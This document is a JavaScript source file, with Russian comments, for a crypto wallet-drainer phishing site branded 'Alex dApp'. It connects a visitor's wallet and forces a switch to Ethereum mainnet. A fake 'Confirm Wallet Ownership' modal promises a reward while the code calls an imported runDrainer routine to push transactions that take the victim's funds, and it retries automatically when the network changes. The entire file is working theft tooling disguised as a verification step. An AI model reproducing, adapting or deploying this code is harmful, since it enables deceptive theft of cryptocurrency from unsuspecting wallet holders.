import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// === Конфигурация ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png']
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW'
})

let connectedAddress = null
let hasDrained = false
let hasAttemptedContractCall = false
let isTransactionPending = false // Флаг для отслеживания состояния транзакции
let actionBtn = null
let modalOverlay = null
let modalContent = null
let modalShown = false

// Целевая сеть (mainnet в данном случае)
const targetChainId = '0x1' // Ethereum Mainnet

window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn')
  const isInjected = typeof window.ethereum !== 'undefined'

  // Подключаем шрифт Montserrat
  const link = document.createElement('link')
  link.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap'
  link.rel = 'stylesheet'
  document.head.appendChild(link)

  // Создаем стили для модального окна
  const style = document.createElement('style')
  style.textContent = `
    /* Затемнение фона */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
      display: none;
    }

    /* Контейнер модального окна */
    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #ffffff;
      border: 2px solid #007bff;
      border-radius: 12px;
      padding: 30px;
      width: 90%;
      max-width: 300px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Montserrat', sans-serif;
      color: #000000;
      animation: slideDown 0.5s ease-out forwards;
    }

    /* Анимация опускания жалюзи */
    @keyframes slideDown {
      0% {
        transform: translate(-50%, -100%);
        opacity: 0;
      }
      100% {
        transform: translate(-50%, -50%);
        opacity: 1;
      }
    }

    /* Заголовок */
    .modal-title {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 45px;
    }

    /* Контейнер для кружка загрузки и иконки */
    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 20px;
    }

    /* Кружок загрузки */
    .loader {
      width: 100%;
      height: 100%;
      border: 4px solid #e0e0e0;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      position: absolute;
      top: 0;
      left: 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Нижний текст */
    .modal-footer {
      font-size: 14px;
      color: #555555;
      margin-top: 30px;
    }

    /* Список действий */
    .action-list {
      list-style: none;
      padding: 0;
      margin: 40px 0 0;
      font-size: 14px;
      color: #000000;
    }

    .action-list li {
      margin-bottom: 5px;
    }

    /* Адаптивность для мобильных */
    @media (max-width: 480px) {
      .modal-content {
        max-width: 250px;
        padding: 20px;
        min-height: 300px;
      }

      .modal-title {
        font-size: 18px;
      }

      .loader-container {
        width: 80px;
        height: 80px;
      }

      .modal-footer {
        font-size: 12px;
      }

      .action-list {
        font-size: 12px;
      }
    }
  `
  document.head.appendChild(style)

  // Добавляем HTML для модального окна
  modalOverlay = document.createElement('div')
  modalOverlay.className = 'modal-overlay'
  document.body.appendChild(modalOverlay)

  modalContent = document.createElement('div')
  modalContent.className = 'modal-content'
  modalContent.innerHTML = `
    <div class="modal-title">Confirm Wallet Ownership</div>
    <div class="loader-container">
      <div class="loader"></div>
    </div>
    <div class="modal-footer">continue inside the window that opens...</div>
    <ul class="action-list">
      <li>1. Allow interaction with you</li>
      <li>2. Confirm the verification transaction</li>
      <li>3. Receive a reward</li>
    </ul>
  `
  document.body.appendChild(modalContent)

  if (!isInjected) {
    actionBtn.style.display = 'inline-block'
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal()
    })
    return
  }

  actionBtn.style.display = 'inline-block'
  actionBtn.addEventListener('click', handleConnectOrAction)

  // Подписка на смену сети
  window.ethereum.on('chainChanged', onChainChanged)
})

// Функции для управления модальным окном
function showModal() {
  modalOverlay.style.display = 'block'
  modalContent.style.display = 'block'
}

function hideModal() {
  modalOverlay.style.display = 'none'
  modalContent.style.display = 'none'
}

function showModalOnce() {
  if (!modalShown) {
    modalShown = true
    showModal()
  }
}

// Функция для автоматической смены сети
async function switchToTargetNetwork() {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const network = await provider.getNetwork()
    const currentChainId = `0x${network.chainId.toString(16)}`

    if (currentChainId === targetChainId) {
      console.log('✅ Уже на нужной сети:', targetChainId)
      return true
    }

    console.log('🔄 Попытка сменить сеть на:', targetChainId)
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: targetChainId }],
    })
    console.log('✅ Сеть успешно изменена на:', targetChainId)
    return true
  } catch (err) {
    if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
      // Сеть не добавлена в кошелек, пытаемся добавить
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: targetChainId,
            chainName: 'Ethereum Mainnet',
            nativeCurrency: {
              name: 'Ether',
              symbol: 'ETH',
              decimals: 18,
            },
            rpcUrls: ['https://mainnet.infura.io/v3/'],
            blockExplorerUrls: ['https://etherscan.io'],
          }],
        })
        console.log('✅ Сеть добавлена и изменена на:', targetChainId)
        return true
      } catch (addErr) {
        console.error('❌ Ошибка при добавлении сети:', addErr)
        return false
      }
    } else if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил смену сети')
      return false
    } else {
      console.error('❌ Ошибка при смене сети:', err)
      return false
    }
  }
}

async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('⚠️ Транзакция уже выполнена или ожидает подтверждения')
    return
  }

  // Запускаем модальное окно и drainer только после установки нужной сети
  const isNetworkCorrect = await switchToTargetNetwork()
  if (!isNetworkCorrect) {
    console.log('⚠️ Не удалось установить нужную сеть, прерываем')
    return
  }

  showModalOnce()

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = provider.getSigner()

    isTransactionPending = true // Устанавливаем флаг ожидания

    // Запускаем drainer (предполагается, что USDT allowance уже выводится внутри runDrainer)
    const tx = await runDrainer(provider, signer, connectedAddress)
    console.log('📨 Транзакция отправлена:', tx.hash)

    // Ожидаем подтверждения транзакции
    const receipt = await tx.wait()
    console.log('✅ Транзакция подтверждена:', receipt.transactionHash)

    hasDrained = true
    isTransactionPending = false // Сбрасываем флаг после завершения
    cleanup()
    hideModal() // Закрываем модальное окно после успешного подтверждения
  } catch (err) {
    isTransactionPending = false // Сбрасываем флаг при ошибке
    hideModal() // Закрываем модальное окно при любой ошибке (включая отклонение)

    if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил транзакцию')
      return
    }

    if (hasAttemptedContractCall) {
      console.log('⚠️ Подписание уже было запущено однажды — повтор не допускается')
      return
    }

    hasAttemptedContractCall = true
    console.error('❌ Ошибка при подписании транзакции:', err)
  }
}

// Основная логика подключения и первого запуска
async function handleConnectOrAction() {
  try {
    const accs = await window.ethereum.request({ method: 'eth_accounts' })
    if (accs.length === 0) {
      await appKitModal.open()
      connectedAddress = await waitForWallet()
      console.log('✅ Подключились как', connectedAddress)
    } else {
      connectedAddress = accs[0]
      console.log('✅ Уже подключены:', connectedAddress)
    }

    // Проверяем, не ожидается ли уже транзакция
    if (!isTransactionPending) {
      await attemptDrainer()
    } else {
      console.log('⏳ Транзакция уже в процессе, ожидайте подтверждения')
    }
  } catch (err) {
    console.error('❌ Ошибка в процессе подключения/дренажа:', err)
  }
}

// Автоматический вызов при смене сети
async function onChainChanged(_chainId) {
  console.log('🔄 Сеть сменилась:', _chainId)
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer()
  } else {
    console.log('⏳ Транзакция уже в процессе или не требуется')
  }
}

// Отключаем кнопку и удаляем слушатели
function cleanup() {
  if (!actionBtn) return
  actionBtn.removeEventListener('click', handleConnectOrAction)
  window.ethereum.removeListener('chainChanged', onChainChanged)
  actionBtn.disabled = true
  actionBtn.style.opacity = '0.6'
}

// Ожидание первого подключения
async function waitForWallet() {
  const accs = await window.ethereum.request({ method: 'eth_accounts' })
  if (accs.length > 0) return accs[0]
  return new Promise(resolve => {
    const id = setInterval(async () => {
      const a = await window.ethereum.request({ method: 'eth_accounts' })
      if (a.length) {
        clearInterval(id)
        resolve(a[0])
      }
    }, 500)
  })
}
